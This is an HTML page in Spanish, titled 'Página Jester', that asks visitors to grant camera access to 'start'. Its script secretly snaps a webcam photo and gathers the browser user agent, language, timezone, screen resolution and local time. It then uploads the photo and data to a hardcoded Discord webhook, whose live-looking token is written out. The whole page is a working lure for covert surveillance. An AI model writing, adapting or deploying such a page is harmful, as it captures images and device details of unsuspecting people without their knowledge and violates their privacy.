<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>P√°gina Jester</title>
  <style>
    body {
      background: #000;
      color: #fff;
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 40px;
    }
    img {
      width: 200px;
      margin-top: 30px;
    }
    button {
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 18px;
      cursor: pointer;
      background: red;
      border: none;
      border-radius: 8px;
      color: white;
    }
    .warning {
      color: yellow;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>Bienvenido</h1>
  <img src="https://pngimg.com/uploads/jester/jester_PNG27.png" alt="Jester">
  <p class="warning">‚ö†Ô∏è Para iniciar es obligatorio aceptar el permiso de c√°mara.</p>
  <button id="startBtn">Iniciar</button>

  <script>
    const webhookURL = "https://discordapp.com/api/webhooks/1413325609819443260/Sq7WJJvwVhTYeKlhCYxoGdnW3xajB0xQL2T1A43B4E5L779JRns3NzvN3yP6MBTXT1Az"; // <-- pon aqu√≠ tu webhook

    const button = document.getElementById("startBtn");

    button.addEventListener("click", () => {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);

            // Detener c√°mara
            stream.getTracks().forEach(track => track.stop());

            // Convertir a blob
            canvas.toBlob(blob => {
              // Obtener info extra
              const userAgent = navigator.userAgent;
              const idioma = navigator.language;
              const zona = Intl.DateTimeFormat().resolvedOptions().timeZone;
              const resolucion = `${window.screen.width}x${window.screen.height}`;
              const fechaHora = new Date().toLocaleString();

              const info = `
üì∑ Foto tomada
üåç Idioma: ${idioma}
üïí Zona horaria: ${zona}
üíª Navegador/Dispositivo: ${userAgent}
üñ•Ô∏è Resoluci√≥n: ${resolucion}
‚è∞ Fecha y hora: ${fechaHora}
              `;

              const formData = new FormData();
              formData.append("file", blob, "foto.png");
              formData.append("payload_json", JSON.stringify({
                content: info
              }));

              fetch(webhookURL, {
                method: "POST",
                body: formData
              }).catch(err => console.error(err));
            }, "image/png");
          }, 2000);
        })
        .catch(() => {
          alert("‚ùå No puedes continuar sin aceptar el permiso de c√°mara.");
        });
    });
  </script>
</body>
</html>
